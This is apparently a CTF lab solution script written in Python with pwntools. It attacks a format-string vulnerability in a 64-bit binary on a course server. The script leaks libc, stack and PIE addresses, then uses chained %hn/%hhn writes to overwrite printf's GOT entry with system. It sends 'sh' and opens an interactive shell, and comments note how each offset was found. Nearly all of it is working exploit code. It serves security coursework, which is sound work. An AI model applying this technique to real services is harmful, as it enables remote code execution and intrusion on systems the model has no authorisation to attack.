'''
Arch:     amd64-64-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
 (data / code also ASLR)
'''

#rdi, rsi, rdx, rcx, r8, r9
from pwn import *
from termcolor import colored
r = remote("csie.ctf.tw", 10130)

# r = process('./lab-2')
r.send('|%11$p||')
libc_base = int(r.recvuntil('||').split('|')[-3],16) - 0x21b97
print(colored('libc_base  : %x' % libc_base,'yellow')) 
###########################################
#   by command : readelf  -a lab-1.so | grep start
#   we get: 0000000000021ab0  -> __libc_start_main@@GLIBC_2.2.5
#   0x21ab0 is libc_start_main's offset.
#   And, we use gdb find $11$p is <__libc_start_main+231>
#   Thus, %11$p - 231 - 0x21ab0 = libc_base
############################################
r.send('|%6$p||')
stack_base = int(r.recvuntil('||').split('|')[-3],16)
print(colored('stack_base : %x' % stack_base,'yellow')) 

r.send('|%7$p||')
pie = int(r.recvuntil('||').split('|')[-3],16) - 0x8ce
print(colored('pie        : %x' % pie,'yellow')) 
############################################
# By `vmmap in peda`, 
# 0x0000555555554000 0x0000555555555000 r-xp	/home/arvin/Desktop/class/CTF/lab5/lab-2
# We know 0x0000555555554000 is pie.
# And find related value 0x00005555555548ce in %7$p
#############################################

#===========================================================================
#===========================================================================

printf_got = pie + 0x200da8
print(colored('printf_GOT : %x' % printf_got,'yellow')) 
##################################################
# by `readelf  -r lab-2`, we can find GOT offset.
# However, we need to leak pie.
##################################################
system = libc_base + 0x4f440
##################################################
# by `readelf  -a lab-1.so | grep system`, we can find where to call system
# However, "call" needs to add libc_base
##################################################

#===========================================================================
#===========================================================================
def fmt( p ):
	r.send(p)
	sleep(0.3)
def get(i,n):
	return (i>>16*(n-1))&0xffff
b = stack_base + 0x10 & 0xff
fmt( '%{}c%8$hn'.format( get( printf_got, 1 ) ) )
print(hex(get( printf_got, 1 )))
fmt( '%{}c%6$hhn'.format( b+2 ) )

fmt( '%{}c%8$hn'.format( get( printf_got, 2 ) ) )
print(hex(get( printf_got, 2 )))
fmt( '%{}c%6$hhn'.format( b+4 ) )
fmt( '%{}c%8$hn'.format( get( printf_got, 3 ) ) )
print(hex(get( printf_got, 3 )))

fmt( '%{}c%6$hhn'.format( b+8 ) )
fmt( '%{}c%8$hn'.format( get( printf_got + 1, 1 ) ) )
print(hex(get( printf_got+1, 1 )))

fmt( '%{}c%6$hhn'.format( b+8+2 ) )
fmt( '%{}c%8$hn'.format( get( printf_got + 1, 2 ) ) )
print(hex(get( printf_got+1, 2 )))

fmt( '%{}c%6$hhn'.format( b+8+4 ) )
fmt( '%{}c%8$hn'.format( get( printf_got + 1, 3 ) ) )
print(hex(get( printf_got+1, 3 )))
# exit()

a = system & 0xff
b = (system & 0xffff00) >> 8
fmt( '%{}c%10$hhn%{}c%11$hn'.format(a,b-a) )
sleep(1)
r.send('sh')
r.interactive()

